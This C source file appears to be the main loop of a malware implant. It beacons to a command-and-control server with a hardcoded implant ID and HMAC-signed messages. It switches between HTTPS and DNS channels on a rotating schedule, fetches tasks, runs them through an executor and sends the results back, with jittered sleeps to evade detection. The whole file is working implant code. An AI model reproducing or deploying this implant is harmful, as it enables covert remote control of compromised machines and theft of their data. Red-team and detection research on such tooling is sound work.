#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#ifdef _WIN32
    #include <winsock2.h>
    #include <windows.h>
#else
    #define _POSIX_C_SOURCE 200809L
    #include <unistd.h>
    #include <sys/random.h>
#endif

#include "crypto/sha256.c"
#include "crypto/crypto.c"
#include "beacon/beacon.c"
#include "hmac/hmac.c"
#include "protocols/https.c"
#include "protocols/dns.c"
#include "executor/executor.c"
#include "protocols/websocket.c"
#include "protocols/doh.c"

#define INTERVAL     60
#define MAX_JITTER   30
#define WINDOW_SIZE  300000000000ULL

static uint8_t implant_id[16] = {
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
    0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10
};

static void send_beacon(uint8_t *signed_beacon, size_t signed_len, uint8_t protocol,
                        uint8_t *task_buf, size_t *task_len) {
    switch (protocol) {
        case 0:
            https_send_beacon(signed_beacon, signed_len, task_buf, task_len);
            break;
        case 1:
            dns_send_beacon(signed_beacon, signed_len, task_buf, task_len);
            break;
        default:
            break;
    }
}

static uint8_t* build_signed_beacon(struct Beacon *b, uint8_t key[32], size_t *out_len) {
    size_t raw_len = 0;
    uint8_t *raw = serialize(b, &raw_len);
    if (!raw) return NULL;
    uint8_t sig[32];
    SignBeacon(key, raw, raw_len, sig);

    uint8_t *signed_buf = (uint8_t*)malloc(raw_len + 32);
    if (!signed_buf) {
        free(raw);
        return NULL;
    }
    memcpy(signed_buf, raw, raw_len);
    memcpy(signed_buf + raw_len, sig, 32);
    *out_len = raw_len + 32;
    free(raw);
    return signed_buf;
}

int main() {
#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
#endif
    uint8_t key[32];
    get_key(key);
    struct Beacon cb;
    memcpy(cb.implant_id, implant_id, 16);
    cb.type     = 0;
    char *sysinfo = "unknown";
    cb.data_len = (uint32_t)strlen(sysinfo);
    cb.data     = (uint8_t*)sysinfo;
    size_t cb_signed_len = 0;
    uint8_t *cb_signed = build_signed_beacon(&cb, key, &cb_signed_len);
    if (cb_signed) {
        uint8_t dummy[4096];
        size_t dummy_len = 0;
        uint8_t init_protocol = get_protocol(key, get_counter(WINDOW_SIZE));
        send_beacon(cb_signed, cb_signed_len, init_protocol, dummy, &dummy_len);
        free(cb_signed);
    }
    while(1) {
        uint64_t counter = get_counter(WINDOW_SIZE);
        uint8_t protocol = get_protocol(key, counter);
        struct Beacon b;
        memcpy(b.implant_id, implant_id, 16);
        b.type     = 2;
        b.data_len = 0;
        b.data     = NULL;
        size_t signed_len = 0;
        uint8_t *signed_beacon = build_signed_beacon(&b, key, &signed_len);
        uint8_t task_buf[4096];
        size_t task_len = 0;
        if (signed_beacon) {
            send_beacon(signed_beacon, signed_len, protocol, task_buf, &task_len);
            free(signed_beacon);
        }
        printf("task_len: %zu\n", task_len);
        if (task_len > 0)
            printf("task[0]: %02x\n", task_buf[0]);
        if (task_len > 0 && !(task_len == 4 && memcmp(task_buf, "noop", 4) == 0)) {
            struct Task *t = parse_task(task_buf, task_len);
            if (t) {
                uint8_t result[65536];
                size_t result_len = execute_task(t, result, sizeof(result));
                printf("result_len: %zu\n", result_len);
                if (result_len > 0) {
                    struct Beacon rb;
                    memcpy(rb.implant_id, implant_id, 16);
                    rb.type     = 1;
                    rb.data_len = (uint32_t)result_len;
                    rb.data     = result;
                    size_t rsigned_len = 0;
                    uint8_t *rsigned = build_signed_beacon(&rb, key, &rsigned_len);
                    if (rsigned) {
                        uint8_t dummy2[4096];
                        size_t dummy2_len = 0;
                        send_beacon(rsigned, rsigned_len, protocol, dummy2, &dummy2_len);
                        free(rsigned);
                    }
                }
                if (t->data) free(t->data);
                free(t);
            }
        }
        uint32_t jitter = 0;
#ifdef _WIN32
        jitter = (uint32_t)rand();
        Sleep((INTERVAL + (jitter % MAX_JITTER)) * 1000);
#else
        if (getentropy(&jitter, sizeof(jitter)) != 0) {
            jitter = (uint32_t)rand();
        }
        sleep(INTERVAL + (jitter % MAX_JITTER));
#endif
    }
#ifdef _WIN32
    WSACleanup();
#endif
    return 0;
}
